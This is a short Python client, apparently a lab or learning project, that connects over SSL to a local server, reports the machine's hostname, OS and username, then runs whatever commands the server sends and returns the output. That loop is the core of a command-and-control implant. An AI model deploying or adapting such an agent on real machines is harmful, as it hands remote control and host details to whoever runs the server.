from client.client import SSLClient
from utils.logger import setup_logger
import json
import platform
import socket
import getpass

logger = setup_logger()


def collect_client_info():

    return {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "user": getpass.getuser(),
        "release": platform.release(),
    }


def main():

    client = SSLClient(
        server_host="127.0.0.1",
        server_port=8888,
        sni_hostname="localhost",
        client_cert="../../certs/cert.pem",
        client_key="../../certs/key.pem",
    )

    try:

        client.connect()

        print("Connected to server")

        info = collect_client_info()

        client.send(json.dumps(info))

        while True:

            command = client.receive()

            if command is None:
                print("Server disconnected")
                break

            print("Received command:", command)

            response = client.execute_command(command)

            client.send(response)

    except Exception as e:

        print("Client error:", e)

    finally:

        client.close()


if __name__ == "__main__":
    main()
